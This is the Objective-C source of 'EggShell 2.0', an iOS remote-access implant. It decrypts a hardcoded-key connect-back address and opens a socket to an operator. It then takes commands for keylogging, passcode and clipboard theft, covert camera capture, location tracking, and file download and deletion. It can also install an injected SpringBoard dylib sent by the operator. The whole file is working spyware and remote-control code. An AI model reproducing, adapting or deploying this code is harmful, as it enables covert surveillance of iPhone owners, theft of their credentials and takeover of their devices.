//EggShell 2.0
//Created By lucas.py 8-18-16
//Last update 9-17-16
//Copyright 2016 Lucas Jackson

#include "espl.h"

NSFileManager *filemanager = [NSFileManager alloc];;
espl *_espl;

bool debug = false;
NSString *TERM = @"EOF6D2ONE";
NSString *tmpData = @"";

NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
@"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",@"keylogclear",nil];
NSArray *yesReplyCommands = [[NSArray alloc] initWithObjects:
@"getpasscode",@"getpaste",@"unlock",@"keylog",nil];

int main(int argc, char **argv, char **envp) {
    _espl = [[espl alloc] init];
    
    //this actually fucks up the alert command idk why
    //[filemanager removeItemAtPath:[NSString stringWithFormat:@"%s",argv[0]] error:nil]; //delete self and cry
    
    [filemanager changeCurrentDirectoryPath:NSHomeDirectory()];

    int success;
    if (debug) {
        success = [_espl connect:[NSString stringWithFormat:@"%@",@"192.168.1.104"] :atoi("4444")];
        _espl.skey = @"12345678123456781234567812345678";
    }
    else {
        //decrypt argument to connectback
        NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
        NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:argument options:0];
        argument = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
        argument = [FBEncryptorAES decryptBase64String:argument keyString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"]; //shared decryption key
        NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
        _espl.skey = args[2];
    }
    if (success != -1) {
	    NSString *name = [NSString stringWithFormat:@"%@@%@",NSUserName(),[[UIDevice currentDevice] name]];
        [_espl sendString:name:_espl.skey];
        NSString *recvData;
        char buffer[2048];
        bool isReceivingFile = false;
        while (read(sockfd, &buffer, sizeof(buffer))) {
            recvData = [NSString stringWithFormat:@"%s",buffer];
            recvData = [recvData stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
            recvData = [FBEncryptorAES decryptBase64String:recvData keyString:_espl.skey];
            
            //ARGUMENTS of command
            NSArray *cmdarray = [recvData componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        
            //TODO: Make this command better, I suck, also whatever i said in osx version all 1 command
            if (isReceivingFile == true) {
                tmpData = [NSString stringWithFormat:@"%@%@",tmpData,recvData];
                if (strstr([tmpData UTF8String],[TERM UTF8String])) {
                    isReceivingFile = false;
                    tmpData = [tmpData stringByReplacingOccurrencesOfString:TERM withString:@""];
                    NSData *rawdata = [[NSData alloc] initWithBase64EncodedString:tmpData options: NSDataBase64DecodingIgnoreUnknownCharacters];
                    [rawdata writeToFile:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib" atomically:true];
                    tmpData = @"";
                    [_espl exec:@"echo '{ Filter = { Bundles = ( \"com.apple.springboard\" ); }; }' > /Library/MobileSubstrate/DynamicLibraries/eggshellPro.plist; killall SpringBoard"];
                }
                else {
                    [_espl blank];
                }
            }
            else if ([cmdarray[0] isEqualToString: @"exit"]) {
                exit(1);
            }
            else if ([cmdarray[0] isEqualToString: @"getpid"]) {
                [_espl getPid];
            }
            else if ([cmdarray[0] isEqualToString: @"vibrate"]) {
                [_espl vibrate];
            }
            else if ([cmdarray[0] isEqualToString: @"alert"]) {
                [_espl alert:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"ls"]) {
                [_espl directoryList:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"cd"]) {
                [_espl changeWD:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"rm"]) {
                [_espl rmFile:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"pwd"]) {
                [_espl sendString:filemanager.currentDirectoryPath:_espl.skey];
            }
            else if ([cmdarray[0] isEqualToString: @"download"]) {
                [_espl download:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"setvol"]) {
                [_espl setVolume:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"getvol"]) {
                [_espl getVolume];
            }
            else if ([cmdarray[0] isEqualToString: @"isplaying"]) {
                [_espl isplaying];
            }
            else if ([cmdarray[0] isEqualToString: @"openurl"]) {
                [_espl openURL:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"frontcam"]) {
                [_espl camera:true];
            }
            else if ([cmdarray[0] isEqualToString: @"backcam"]) {
                [_espl camera:false];
            }
            else if ([cmdarray[0] isEqualToString: @"locate"]) {
                [_espl locate];
            }
            else if ([cmdarray[0] isEqualToString: @"respring"]) {
                [_espl exec:@"killall SpringBoard"];
            }
            else if ([cmdarray[0] isEqualToString: @"say"]) {
                [_espl say:[recvData stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
            }
            else if ([cmdarray[0] isEqualToString: @"installpro"]) {
                isReceivingFile = true;
            }
            //PRO Commands
            else if ([cmdarray[0] isEqualToString: @"locationservice"]) {
                [_espl locationService:cmdarray];
            }
            else if ([noReplyCommands containsObject:cmdarray[0]]) {
                [_espl mcSendNoReply:cmdarray[0]];
            }
            else if ([yesReplyCommands containsObject:cmdarray[0]]) {
                [_espl mcSendYesReply:cmdarray[0]];
            }
            else {
                [_espl sendString:@"-1":_espl.skey];
            }
            //clear the received data
            memset(buffer,'\0',2048);
        }
    }
	return 0;
}
